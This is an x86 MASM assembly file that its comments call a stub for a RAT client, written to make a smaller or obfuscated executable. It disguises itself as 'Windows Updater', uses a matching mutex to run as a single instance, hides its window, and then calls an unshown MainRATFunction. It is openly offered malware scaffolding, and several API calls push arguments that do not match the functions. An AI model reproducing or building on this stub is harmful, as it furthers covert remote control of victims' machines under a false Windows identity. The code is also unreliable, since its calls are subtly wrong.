; Assembly stub for the RAT client
; This stub can be used to create a smaller executable or for obfuscation

.386
.model flat, stdcall
option casemap:none

include windows.inc
include kernel32.inc
include user32.inc

includelib kernel32.lib
includelib user32.lib

.data
    szTitle db "Windows Updater", 0
    szMessage db "Windows Updater is running in the background.", 0
    szMutex db "WindowsUpdateMutex", 0
    szKernel32 db "kernel32.dll", 0
    szCreateMutex db "CreateMutexA", 0
    szCloseHandle db "CloseHandle", 0
    szGetLastError db "GetLastError", 0
    szSleep db "Sleep", 0
    szExitProcess db "ExitProcess", 0
    szLoadLibrary db "LoadLibraryA", 0
    szGetProcAddress db "GetProcAddress", 0

.data?
    hInstance dd ?
    hMutex dd ?
    hKernel32 dd ?
    pCreateMutex dd ?
    pCloseHandle dd ?
    pGetLastError dd ?
    pSleep dd ?
    pExitProcess dd ?
    pLoadLibrary dd ?
    pGetProcAddress dd ?

.code
start:
    ; Get module handle
    push NULL
    call GetModuleHandle
    mov hInstance, eax
    
    ; Load kernel32.dll
    push offset szKernel32
    call LoadLibrary
    mov hKernel32, eax
    
    ; Get function addresses
    push offset szCreateMutex
    push hKernel32
    call GetProcAddress
    mov pCreateMutex, eax
    
    push offset szCloseHandle
    push hKernel32
    call GetProcAddress
    mov pCloseHandle, eax
    
    push offset szGetLastError
    push hKernel32
    call GetProcAddress
    mov pGetLastError, eax
    
    push offset szSleep
    push hKernel32
    call GetProcAddress
    mov pSleep, eax
    
    push offset szExitProcess
    push hKernel32
    call GetProcAddress
    mov pExitProcess, eax
    
    ; Check if another instance is running
    push NULL
    push NULL
    push NULL
    push offset szMutex
    push NULL
    call pCreateMutex
    mov hMutex, eax
    
    call pGetLastError
    cmp eax, ERROR_ALREADY_EXISTS
    je exit_program
    
    ; Hide console window
    push SW_HIDE
    push NULL
    call FindWindow
    push SW_HIDE
    call ShowWindow
    
    ; Sleep for a moment to allow system to stabilize
    push 1000
    call pSleep
    
    ; Call the main RAT function (this would be defined elsewhere)
    call MainRATFunction
    
exit_program:
    ; Clean up and exit
    push hMutex
    call pCloseHandle
    
    push 0
    call pExitProcess
    
end start
